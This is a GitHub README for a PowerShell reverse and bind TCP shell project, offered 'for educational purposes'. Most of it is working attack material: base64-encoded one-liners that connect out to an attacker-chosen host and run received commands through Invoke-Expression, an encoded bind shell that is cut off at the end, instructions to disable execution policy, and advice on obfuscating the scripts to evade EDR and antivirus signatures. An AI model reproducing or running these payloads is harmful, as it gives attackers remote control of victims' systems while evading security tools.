# PowerShell Reverse TCP

PowerShell scripts for communicating with a remote host.

Remote host will have a full control over the client and all the underlying system commands.

All shells are based on `Invoke-Expression` command, not on process pipes.

Tested with PowerShell v5.1.19041.1151 on Windows 10 Enterprise OS (64-bit).

Made for educational purposes. I hope it will help!

**This repository started to have known signatures and I don't have time to upload new scripts each time so you should obfuscate these scripts yourself.**

## Table of Contents

* [How to Run](#how-to-run)
* [PowerShell Obfuscation](#powershell-obfuscation)
	* [PowerShell Encoded Command](#powershell-encoded-command)
	* [PowerShell SecureString](#powershell-securestring)
* [AMSI Bypass](#amsi-bypass)
* [MS Word](#ms-word)
* [Set Up a Listener](#set-up-a-listener)
* [Images](#images)

## How to Run

**Change the IP address and port number inside the scripts as necessary.**

Open the PowerShell from [\\src\\](https://github.com/ivan-sincek/powershell-reverse-tcp/tree/master/src) and run the commands shown below.

Set the execution policy:

```pwsh
Set-ExecutionPolicy Unrestricted
```

Run the script:

```pwsh
.\powershell_reverse_tcp.ps1
```

Or, run the following command from either PowerShell or Command Prompt:

```pwsh
PowerShell -ExecutionPolicy Unrestricted -File .\powershell_reverse_tcp.ps1
```

## PowerShell Obfuscation

Try to bypass EDR and other security mechanisms by obfuscating your scripts. You can see such obfuscations in the examples below.

Original PowerShell command:

```pwsh
(New-Object Net.WebClient).DownloadFile($url, $out)
```

Obfuscated PowerShell command:

```pwsh
& (`G`C`M *ke-E*) '(& (`G`C`M *ew-O*) `N`E`T`.`W`E`B`C`L`I`E`N`T)."`D`O`W`N`L`O`A`D`F`I`L`E"($url, $out)'
```

**Check the original PowerShell script [here](https://github.com/ivan-sincek/powershell-reverse-tcp/blob/master/src/powershell_reverse_tcp.ps1) and the fully obfuscated one [here](https://github.com/ivan-sincek/powershell-reverse-tcp/blob/master/src/obfuscated/powershell_reverse_tcp_obfuscated.ps1).**

After [manual obfuscation](https://github.com/ivan-sincek/powershell-reverse-tcp/blob/master/src/manual/powershell_reverse_tcp_manual.ps1), the original PowerShell script was obfuscated with [Invoke-Obfuscation](https://github.com/danielbohannon/Invoke-Obfuscation). Credits to the author!

Search the Internet for additional obfuscation techniques and methods.

P.S. As the PowerShell is constantly being updated, some regular expressions (e.g. `*ke-E*`) may start to throw errors due to multiple methods matching the same expression, so the expressions will need to be specified a little bit better.

### PowerShell Encoded Command

Use the one-liners below if you don't want to leave any artifacts behind.

**\[Reverse TCP\]** To run the PowerShell encoded command, run the following command from either PowerShell or Command Prompt:

```pwsh
PowerShell -ExecutionPolicy Unrestricted -NoProfile -EncodedCommand JABzAGUAZQBkACAAPQAgACIAMwAzADAAMQBLAGkAcgBhACIAOwAgACQAYQAgAD0AIAAkACgAUgBlAGEAZAAtAEgAbwBzAHQAIAAtAFAAcgBvAG0AcAB0ACAAIgBFAG4AdABlAHIAIABhAGQAZAByAGUAcwBzACIAKQAuAFQAcgBpAG0AKAApADsAIABXAHIAaQB0AGUALQBIAG8AcwB0ACAAIgAiADsAIAAkAHAAIAA9ACAAJAAoAFIAZQBhAGQALQBIAG8AcwB0ACAALQBQAHIAbwBtAHAAdAAgACIARQBuAHQAZQByACAAcABvAHIAdAAgAG4AdQBtAGIAZQByACIAKQAuAFQAcgBpAG0AKAApADsAIABXAHIAaQB0AGUALQBIAG8AcwB0ACAAIgAiADsAIABpAGYAIAAoACQAYQAuAEwAZQBuAGcAdABoACAALQBsAHQAIAAxACAALQBvAHIAIAAkAHAALgBMAGUAbgBnAHQAaAAgAC0AbAB0ACAAMQApACAAewAgAFcAcgBpAHQAZQAtAEgAbwBzAHQAIAAiAEIAbwB0AGgAIABwAGEAcgBhAG0AZQB0AGUAcgBzACAAYQByAGUAIAByAGUAcQB1AGkAcgBlAGQAIgA7ACAAfQAgAGUAbABzAGUAIAB7ACAAVwByAGkAdABlAC0ASABvAHMAdAAgACIAIwAjACMAIwAjACMAIwAjACMAIwAjACMAIwAjACMAIwAjACMAIwAjACMAIwAjACMAIwAjACMAIwAjACMAIwAjACMAIwAjACMAIwAjACMAIwAjACMAIwAjACMAIwAjACMAIwAjACMAIwAjACMAIwAjACMAIwAjACMAIwAjACMAIwAjACMAIwAjACMAIwAjACMAYABuACMAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAjAGAAbgAjACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgAFAAbwB3AGUAcgBTAGgAZQBsAGwAIABSAGUAdgBlAHIAcwBlACAAVABDAFAAIAB2ADMALgA1ACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIwBgAG4AIwAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIABiAHkAIABJAHYAYQBuACAAUwBpAG4AYwBlAGsAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACMAYABuACMAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAjAGAAbgAjACAARwBpAHQASAB1AGIAIAByAGUAcABvAHMAaQB0AG8AcgB5ACAAYQB0ACAAZwBpAHQAaAB1AGIALgBjAG8AbQAvAGkAdgBhAG4ALQBzAGkAbgBjAGUAawAvAHAAbwB3AGUAcgBzAGgAZQBsAGwALQByAGUAdgBlAHIAcwBlAC0AdABjAHAALgAgACAAIwBgAG4AIwAgAEYAZQBlAGwAIABmAHIAZQBlACAAdABvACAAZABvAG4AYQB0AGUAIABiAGkAdABjAG8AaQBuACAAYQB0ACAAMQBCAHIAWgBNADYAVAA3AEcAOQBSAE4AOAB2AGIAYQBiAG4AZgBYAHUANABNADYATABwAGcAegB0AHEANgBZADEANAAuACAAIAAgACMAYABuACMAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAjAGAAbgAjACMAIwAjACMAIwAjACMAIwAjACMAIwAjACMAIwAjACMAIwAjACMAIwAjACMAIwAjACMAIwAjACMAIwAjACMAIwAjACMAIwAjACMAIwAjACMAIwAjACMAIwAjACMAIwAjACMAIwAjACMAIwAjACMAIwAjACMAIwAjACMAIwAjACMAIwAjACMAIwAjACMAIwAiADsAIAAkAGMAIAA9ACAAJABuAHUAbABsADsAIAAkAHQAIAA9ACAAJABuAHUAbABsADsAIAAkAGIAIAA9ACAAJABuAHUAbABsADsAIAAkAHcAIAA9ACAAJABuAHUAbABsADsAIAAkAGQAIAA9ACAAJABuAHUAbABsADsAIAAkAHIAIAA9ACAAJABuAHUAbABsADsAIAB0AHIAeQAgAHsAIAAkAGMAIAA9ACAATgBlAHcALQBPAGIAagBlAGMAdAAgAE4AZQB0AC4AUwBvAGMAawBlAHQAcwAuAFQAYwBwAEMAbABpAGUAbgB0ACgAJABhACwAIAAkAHAAKQA7ACAAJAB0ACAAPQAgACQAYwAuAEcAZQB0AFMAdAByAGUAYQBtACgAKQA7ACAAJABiACAAPQAgAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABCAHkAdABlAFsAXQAgADEAMAAyADQAOwAgACQAZQAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAVABlAHgAdAAuAEEAcwBjAGkAaQBFAG4AYwBvAGQAaQBuAGcAOwAgACQAdwAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAASQBPAC4AUwB0AHIAZQBhAG0AVwByAGkAdABlAHIAKAAkAHQAKQA7ACAAJAB3AC4AQQB1AHQAbwBGAGwAdQBzAGgAIAA9ACAAJAB0AHIAdQBlADsAIABXAHIAaQB0AGUALQBIAG8AcwB0ACAAIgBCAGEAYwBrAGQAbwBvAHIAIABpAHMAIAB1AHAAIABhAG4AZAAgAHIAdQBuAG4AaQBuAGcALgAuAC4AYABuACIAOwAgACQAYgB5ACAAPQAgADAAOwAgAGQAbwAgAHsAIAAkAHcALgBXAHIAaQB0AGUAKAAiAFAAUwA+ACIAKQA7ACAAZABvACAAewAgACQAYgB5ACAAPQAgACQAdAAuAFIAZQBhAGQAKAAkAGIALAAgADAALAAgACQAYgAuAEwAZQBuAGcAdABoACkAOwAgAGkAZgAgACgAJABiAHkAIAAtAGcAdAAgADAAKQAgAHsAIAAkAGQAIAA9ACAAJABkACAAKwAgACQAZQAuAEcAZQB0AFMAdAByAGkAbgBnACgAJABiACwAIAAwACwAIAAkAGIAeQApADsAIAB9ACAAfQAgAHcAaABpAGwAZQAgACgAJAB0AC4ARABhAHQAYQBBAHYAYQBpAGwAYQBiAGwAZQApADsAIABpAGYAIAAoACQAYgB5ACAALQBnAHQAIAAwACkAIAB7ACAAJABkACAAPQAgACQAZAAuAFQAcgBpAG0AKAApADsAIABpAGYAIAAoACQAZAAuAEwAZQBuAGcAdABoACAALQBnAHQAIAAwACkAIAB7ACAAdAByAHkAIAB7ACAAJAByACAAPQAgAEkAbgB2AG8AawBlAC0ARQB4AHAAcgBlAHMAcwBpAG8AbgAgAC0AQwBvAG0AbQBhAG4AZAAgACQAZAAgADIAPgAmADEAIAB8ACAATwB1AHQALQBTAHQAcgBpAG4AZwA7ACAAfQAgAGMAYQB0AGMAaAAgAHsAIAAkAHIAIAA9ACAAJABfAC4ARQB4AGMAZQBwAHQAaQBvAG4AIAB8ACAATwB1AHQALQBTAHQAcgBpAG4AZwA7ACAAfQAgAEMAbABlAGEAcgAtAFYAYQByAGkAYQBiAGwAZQAgAC0ATgBhAG0AZQAgACIAZAAiADsAIAAkAGwAZQAgAD0AIAAkAHIALgBMAGUAbgBnAHQAaAA7ACAAaQBmACAAKAAkAGwAZQAgAC0AZwB0ACAAMAApACAAewAgACQAYwBvACAAPQAgADAAOwAgAGQAbwAgAHsAIABpAGYAIAAoACQAbABlACAALQBnAGUAIAAkAGIALgBMAGUAbgBnAHQAaAApACAAewAgACQAYgB5ACAAPQAgACQAYgAuAEwAZQBuAGcAdABoADsAIAB9ACAAZQBsAHMAZQAgAHsAIAAkAGIAeQAgAD0AIAAkAGwAZQA7ACAAfQAgACQAdwAuAFcAcgBpAHQAZQAoACQAcgAuAHMAdQBiAHMAdAByAGkAbgBnACgAJABjAG8ALAAgACQAYgB5ACkAKQA7ACAAJABjAG8AIAArAD0AIAAkAGIAeQA7ACAAJABsAGUAIAAtAD0AIAAkAGIAeQA7ACAAfQAgAHcAaABpAGwAZQAgACgAJABsAGUAIAAtAGcAdAAgADAAKQA7ACAAQwBsAGUAYQByAC0AVgBhAHIAaQBhAGIAbABlACAALQBOAGEAbQBlACAAIgByACIAOwAgAH0AIAB9ACAAfQAgAH0AIAB3AGgAaQBsAGUAIAAoACQAYgB5ACAALQBnAHQAIAAwACkAOwAgAFcAcgBpAHQAZQAtAEgAbwBzAHQAIAAiAEIAYQBjAGsAZABvAG8AcgAgAHcAaQBsAGwAIABuAG8AdwAgAGUAeABpAHQALgAuAC4AIgA7ACAAfQAgAGMAYQB0AGMAaAAgAHsAIABXAHIAaQB0AGUALQBIAG8AcwB0ACAAJABfAC4ARQB4AGMAZQBwAHQAaQBvAG4ALgBJAG4AbgBlAHIARQB4AGMAZQBwAHQAaQBvAG4ALgBNAGUAcwBzAGEAZwBlADsAIAB9ACAAZgBpAG4AYQBsAGwAeQAgAHsAIABpAGYAIAAoACQAdwAgAC0AbgBlACAAJABuAHUAbABsACkAIAB7ACAAJAB3AC4AQwBsAG8AcwBlACgAKQA7ACAAJAB3AC4ARABpAHMAcABvAHMAZQAoACkAOwAgAEMAbABlAGEAcgAtAFYAYQByAGkAYQBiAGwAZQAgAC0ATgBhAG0AZQAgACIAdwAiADsAIAB9ACAAaQBmACAAKAAkAHQAIAAtAG4AZQAgACQAbgB1AGwAbAApACAAewAgACQAdAAuAEMAbABvAHMAZQAoACkAOwAgACQAdAAuAEQAaQBzAHAAbwBzAGUAKAApADsAIABDAGwAZQBhAHIALQBWAGEAcgBpAGEAYgBsAGUAIAAtAE4AYQBtAGUAIAAiAHQAIgA7ACAAfQAgAGkAZgAgACgAJABjACAALQBuAGUAIAAkAG4AdQBsAGwAKQAgAHsAIAAkAGMALgBDAGwAbwBzAGUAKAApADsAIAAkAGMALgBEAGkAcwBwAG8AcwBlACgAKQA7ACAAQwBsAGUAYQByAC0AVgBhAHIAaQBhAGIAbABlACAALQBOAGEAbQBlACAAIgBjACIAOwAgAH0AIABpAGYAIAAoACQAYgAgAC0AbgBlACAAJABuAHUAbABsACkAIAB7ACAAJABiAC4AQwBsAGUAYQByACgAKQA7ACAAQwBsAGUAYQByAC0AVgBhAHIAaQBhAGIAbABlACAALQBOAGEAbQBlACAAIgBiACIAOwAgAH0AIABpAGYAIAAoACQAcgAgAC0AbgBlACAAJABuAHUAbABsACkAIAB7ACAAQwBsAGUAYQByAC0AVgBhAHIAaQBhAGIAbABlACAALQBOAGEAbQBlACAAIgByACIAOwAgAH0AIABpAGYAIAAoACQAZAAgAC0AbgBlACAAJABuAHUAbABsACkAIAB7ACAAQwBsAGUAYQByAC0AVgBhAHIAaQBhAGIAbABlACAALQBOAGEAbQBlACAAIgBkACIAOwAgAH0AIABbAFMAeQBzAHQAZQBtAC4ARwBDAF0AOgA6AEMAbwBsAGwAZQBjAHQAKAApADsAIAB9ACAAfQA=
```

The encoded script will prompt for input. See the slightly altered script [here](https://github.com/ivan-sincek/powershell-reverse-tcp/blob/master/src/prompt/powershell_reverse_tcp_prompt.ps1) - used the [minified](https://github.com/ivan-sincek/powershell-reverse-tcp/blob/master/src/prompt/mini/powershell_reverse_tcp_prompt_mini.ps1) script to reduce the command length.

**\[Reverse TCP - Parameterized\]** To pass parameters to the PowerShell encoded command, run the following command from either PowerShell or Command Prompt:

```pwsh
PowerShell -Command "'127.0.0.1', '9000'" | PowerShell -ExecutionPolicy Unrestricted -NoProfile -EncodedCommand JABzAGUAZQBkACAAPQAgACIAMwAzADAAMQBLAGkAcgBhACIAOwAgACQAYQAgAD0AIAAkACgAUgBlAGEAZAAtAEgAbwBzAHQAIAAtAFAAcgBvAG0AcAB0ACAAIgBFAG4AdABlAHIAIABhAGQAZAByAGUAcwBzACIAKQAuAFQAcgBpAG0AKAApADsAIABXAHIAaQB0AGUALQBIAG8AcwB0ACAAIgAiADsAIAAkAHAAIAA9ACAAJAAoAFIAZQBhAGQALQBIAG8AcwB0ACAALQBQAHIAbwBtAHAAdAAgACIARQBuAHQAZQByACAAcABvAHIAdAAgAG4AdQBtAGIAZQByACIAKQAuAFQAcgBpAG0AKAApADsAIABXAHIAaQB0AGUALQBIAG8AcwB0ACAAIgAiADsAIABpAGYAIAAoACQAYQAuAEwAZQBuAGcAdABoACAALQBsAHQAIAAxACAALQBvAHIAIAAkAHAALgBMAGUAbgBnAHQAaAAgAC0AbAB0ACAAMQApACAAewAgAFcAcgBpAHQAZQAtAEgAbwBzAHQAIAAiAEIAbwB0AGgAIABwAGEAcgBhAG0AZQB0AGUAcgBzACAAYQByAGUAIAByAGUAcQB1AGkAcgBlAGQAIgA7ACAAfQAgAGUAbABzAGUAIAB7ACAAVwByAGkAdABlAC0ASABvAHMAdAAgACIAIwAjACMAIwAjACMAIwAjACMAIwAjACMAIwAjACMAIwAjACMAIwAjACMAIwAjACMAIwAjACMAIwAjACMAIwAjACMAIwAjACMAIwAjACMAIwAjACMAIwAjACMAIwAjACMAIwAjACMAIwAjACMAIwAjACMAIwAjACMAIwAjACMAIwAjACMAIwAjACMAIwAjACMAYABuACMAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAjAGAAbgAjACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgAFAAbwB3AGUAcgBTAGgAZQBsAGwAIABSAGUAdgBlAHIAcwBlACAAVABDAFAAIAB2ADMALgA1ACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIwBgAG4AIwAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIABiAHkAIABJAHYAYQBuACAAUwBpAG4AYwBlAGsAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACMAYABuACMAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAjAGAAbgAjACAARwBpAHQASAB1AGIAIAByAGUAcABvAHMAaQB0AG8AcgB5ACAAYQB0ACAAZwBpAHQAaAB1AGIALgBjAG8AbQAvAGkAdgBhAG4ALQBzAGkAbgBjAGUAawAvAHAAbwB3AGUAcgBzAGgAZQBsAGwALQByAGUAdgBlAHIAcwBlAC0AdABjAHAALgAgACAAIwBgAG4AIwAgAEYAZQBlAGwAIABmAHIAZQBlACAAdABvACAAZABvAG4AYQB0AGUAIABiAGkAdABjAG8AaQBuACAAYQB0ACAAMQBCAHIAWgBNADYAVAA3AEcAOQBSAE4AOAB2AGIAYQBiAG4AZgBYAHUANABNADYATABwAGcAegB0AHEANgBZADEANAAuACAAIAAgACMAYABuACMAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAjAGAAbgAjACMAIwAjACMAIwAjACMAIwAjACMAIwAjACMAIwAjACMAIwAjACMAIwAjACMAIwAjACMAIwAjACMAIwAjACMAIwAjACMAIwAjACMAIwAjACMAIwAjACMAIwAjACMAIwAjACMAIwAjACMAIwAjACMAIwAjACMAIwAjACMAIwAjACMAIwAjACMAIwAjACMAIwAiADsAIAAkAGMAIAA9ACAAJABuAHUAbABsADsAIAAkAHQAIAA9ACAAJABuAHUAbABsADsAIAAkAGIAIAA9ACAAJABuAHUAbABsADsAIAAkAHcAIAA9ACAAJABuAHUAbABsADsAIAAkAGQAIAA9ACAAJABuAHUAbABsADsAIAAkAHIAIAA9ACAAJABuAHUAbABsADsAIAB0AHIAeQAgAHsAIAAkAGMAIAA9ACAATgBlAHcALQBPAGIAagBlAGMAdAAgAE4AZQB0AC4AUwBvAGMAawBlAHQAcwAuAFQAYwBwAEMAbABpAGUAbgB0ACgAJABhACwAIAAkAHAAKQA7ACAAJAB0ACAAPQAgACQAYwAuAEcAZQB0AFMAdAByAGUAYQBtACgAKQA7ACAAJABiACAAPQAgAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABCAHkAdABlAFsAXQAgADEAMAAyADQAOwAgACQAZQAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAVABlAHgAdAAuAEEAcwBjAGkAaQBFAG4AYwBvAGQAaQBuAGcAOwAgACQAdwAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAASQBPAC4AUwB0AHIAZQBhAG0AVwByAGkAdABlAHIAKAAkAHQAKQA7ACAAJAB3AC4AQQB1AHQAbwBGAGwAdQBzAGgAIAA9ACAAJAB0AHIAdQBlADsAIABXAHIAaQB0AGUALQBIAG8AcwB0ACAAIgBCAGEAYwBrAGQAbwBvAHIAIABpAHMAIAB1AHAAIABhAG4AZAAgAHIAdQBuAG4AaQBuAGcALgAuAC4AYABuACIAOwAgACQAYgB5ACAAPQAgADAAOwAgAGQAbwAgAHsAIAAkAHcALgBXAHIAaQB0AGUAKAAiAFAAUwA+ACIAKQA7ACAAZABvACAAewAgACQAYgB5ACAAPQAgACQAdAAuAFIAZQBhAGQAKAAkAGIALAAgADAALAAgACQAYgAuAEwAZQBuAGcAdABoACkAOwAgAGkAZgAgACgAJABiAHkAIAAtAGcAdAAgADAAKQAgAHsAIAAkAGQAIAA9ACAAJABkACAAKwAgACQAZQAuAEcAZQB0AFMAdAByAGkAbgBnACgAJABiACwAIAAwACwAIAAkAGIAeQApADsAIAB9ACAAfQAgAHcAaABpAGwAZQAgACgAJAB0AC4ARABhAHQAYQBBAHYAYQBpAGwAYQBiAGwAZQApADsAIABpAGYAIAAoACQAYgB5ACAALQBnAHQAIAAwACkAIAB7ACAAJABkACAAPQAgACQAZAAuAFQAcgBpAG0AKAApADsAIABpAGYAIAAoACQAZAAuAEwAZQBuAGcAdABoACAALQBnAHQAIAAwACkAIAB7ACAAdAByAHkAIAB7ACAAJAByACAAPQAgAEkAbgB2AG8AawBlAC0ARQB4AHAAcgBlAHMAcwBpAG8AbgAgAC0AQwBvAG0AbQBhAG4AZAAgACQAZAAgADIAPgAmADEAIAB8ACAATwB1AHQALQBTAHQAcgBpAG4AZwA7ACAAfQAgAGMAYQB0AGMAaAAgAHsAIAAkAHIAIAA9ACAAJABfAC4ARQB4AGMAZQBwAHQAaQBvAG4AIAB8ACAATwB1AHQALQBTAHQAcgBpAG4AZwA7ACAAfQAgAEMAbABlAGEAcgAtAFYAYQByAGkAYQBiAGwAZQAgAC0ATgBhAG0AZQAgACIAZAAiADsAIAAkAGwAZQAgAD0AIAAkAHIALgBMAGUAbgBnAHQAaAA7ACAAaQBmACAAKAAkAGwAZQAgAC0AZwB0ACAAMAApACAAewAgACQAYwBvACAAPQAgADAAOwAgAGQAbwAgAHsAIABpAGYAIAAoACQAbABlACAALQBnAGUAIAAkAGIALgBMAGUAbgBnAHQAaAApACAAewAgACQAYgB5ACAAPQAgACQAYgAuAEwAZQBuAGcAdABoADsAIAB9ACAAZQBsAHMAZQAgAHsAIAAkAGIAeQAgAD0AIAAkAGwAZQA7ACAAfQAgACQAdwAuAFcAcgBpAHQAZQAoACQAcgAuAHMAdQBiAHMAdAByAGkAbgBnACgAJABjAG8ALAAgACQAYgB5ACkAKQA7ACAAJABjAG8AIAArAD0AIAAkAGIAeQA7ACAAJABsAGUAIAAtAD0AIAAkAGIAeQA7ACAAfQAgAHcAaABpAGwAZQAgACgAJABsAGUAIAAtAGcAdAAgADAAKQA7ACAAQwBsAGUAYQByAC0AVgBhAHIAaQBhAGIAbABlACAALQBOAGEAbQBlACAAIgByACIAOwAgAH0AIAB9ACAAfQAgAH0AIAB3AGgAaQBsAGUAIAAoACQAYgB5ACAALQBnAHQAIAAwACkAOwAgAFcAcgBpAHQAZQAtAEgAbwBzAHQAIAAiAEIAYQBjAGsAZABvAG8AcgAgAHcAaQBsAGwAIABuAG8AdwAgAGUAeABpAHQALgAuAC4AIgA7ACAAfQAgAGMAYQB0AGMAaAAgAHsAIABXAHIAaQB0AGUALQBIAG8AcwB0ACAAJABfAC4ARQB4AGMAZQBwAHQAaQBvAG4ALgBJAG4AbgBlAHIARQB4AGMAZQBwAHQAaQBvAG4ALgBNAGUAcwBzAGEAZwBlADsAIAB9ACAAZgBpAG4AYQBsAGwAeQAgAHsAIABpAGYAIAAoACQAdwAgAC0AbgBlACAAJABuAHUAbABsACkAIAB7ACAAJAB3AC4AQwBsAG8AcwBlACgAKQA7ACAAJAB3AC4ARABpAHMAcABvAHMAZQAoACkAOwAgAEMAbABlAGEAcgAtAFYAYQByAGkAYQBiAGwAZQAgAC0ATgBhAG0AZQAgACIAdwAiADsAIAB9ACAAaQBmACAAKAAkAHQAIAAtAG4AZQAgACQAbgB1AGwAbAApACAAewAgACQAdAAuAEMAbABvAHMAZQAoACkAOwAgACQAdAAuAEQAaQBzAHAAbwBzAGUAKAApADsAIABDAGwAZQBhAHIALQBWAGEAcgBpAGEAYgBsAGUAIAAtAE4AYQBtAGUAIAAiAHQAIgA7ACAAfQAgAGkAZgAgACgAJABjACAALQBuAGUAIAAkAG4AdQBsAGwAKQAgAHsAIAAkAGMALgBDAGwAbwBzAGUAKAApADsAIAAkAGMALgBEAGkAcwBwAG8AcwBlACgAKQA7ACAAQwBsAGUAYQByAC0AVgBhAHIAaQBhAGIAbABlACAALQBOAGEAbQBlACAAIgBjACIAOwAgAH0AIABpAGYAIAAoACQAYgAgAC0AbgBlACAAJABuAHUAbABsACkAIAB7ACAAJABiAC4AQwBsAGUAYQByACgAKQA7ACAAQwBsAGUAYQByAC0AVgBhAHIAaQBhAGIAbABlACAALQBOAGEAbQBlACAAIgBiACIAOwAgAH0AIABpAGYAIAAoACQAcgAgAC0AbgBlACAAJABuAHUAbABsACkAIAB7ACAAQwBsAGUAYQByAC0AVgBhAHIAaQBhAGIAbABlACAALQBOAGEAbQBlACAAIgByACIAOwAgAH0AIABpAGYAIAAoACQAZAAgAC0AbgBlACAAJABuAHUAbABsACkAIAB7ACAAQwBsAGUAYQByAC0AVgBhAHIAaQBhAGIAbABlACAALQBOAGEAbQBlACAAIgBkACIAOwAgAH0AIABbAFMAeQBzAHQAZQBtAC4ARwBDAF0AOgA6AEMAbwBsAGwAZQBjAHQAKAApADsAIAB9ACAAfQA=
```

**\[Bind TCP\]** To run the PowerShell encoded command, run the following command from either PowerShell or Command Prompt:

```pwsh
PowerShell -ExecutionPolicy Unrestricted -NoProfile -EncodedCommand JABzAGUAZQBkACAAPQAgACIAMwAzADAAMQBLAGkAcgBhACIAOwAgACQAcAAgAD0AIAAkACgAUgBlAGEAZAAtAEgAbwBzAHQAIAAtAFAAcgBvAG0AcAB0ACAAIgBFAG4AdABlAHIAIABwAG8AcgB0ACAAbgB1AG0AYgBlAHIAIgApAC4AVAByAGkAbQAoACkAOwAgAFcAcgBpAHQAZQAtAEgAbwBzAHQAIAAiACIAOwAgAGkAZgAgACgAJABwAC4ATABlAG4AZwB0AGgAIAAtAGwAdAAgADEAKQAgAHsAIABXAHIAaQB0AGUALQBIAG8AcwB0ACAAIgBQAG8AcgB0ACAAbgB1AG0AYgBlAHIAIABpAHMAIAByAGUAcQB1AGkAcgBlAGQAIgA7ACAAfQAgAGUAbABzAGUAIAB7ACAAVwByAGkAdABlAC0ASABvAHMAdAAgACIAIwAjACMAIwAjACMAIwAjACMAIwAjACMAIwAjACMAIwAjACMAIwAjACMAIwAjACMAIwAjACMAIwAjACMAIwAjACMAIwAjACMAIwAjACMAIwAjACMAIwAjACMAIwAjACMAIwAjACMAIwAjACMAIwAjACMAIwAjACMAIwAjACMAIwAjACMAIwAjACMAIwAjAGAAbgAjACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACMAYABuACMAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIABQAG8AdwBlAHIAUwBoAGUAbABsACAAQgBpAG4AZAAgAFQAQwBQACAAdgAzAC4ANQAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIwBgAG4AIwAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgAGIAeQAgAEkAdgBhAG4AIABTAGkAbgBjAGUAawAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAjAGAAbgAjACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACMAYABuACMAIABHAGkAdABIAHUAYgAgAHIAZQBwAG8AcwBpAHQAbwByAHkAIABhAHQAIABnAGkAdABoAHUAYgAuAGMAbwBtAC8AaQB2AGEAbgAtAHMAaQBuAGMAZQBrAC8AcABvAHcAZQByAHMAaABlAGwAbAAtAHIAZQB2AGUAcgBzAGUALQB0AGMAcAAuACAAIwBgAG4AIwAgAEYAZQBlAGwAIABmAHIAZQBlACAAdABvACAAZABvAG4AYQB0AGUAIABiAGkAdABjAG8AaQBuACAAYQB0ACAAMQBCAHIAWgBNADYAVAA3AEcAOQBSAE4AOAB2AGIAYQBiAG4AZgBYAHUANABNADYATABwAGcAegB0AHEANgBZADEANAAuACAAIAAjAGAAbgAjACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACMAYABuACMAIwAjACMAIwAjACMAIwAjACMAIwAjACMAI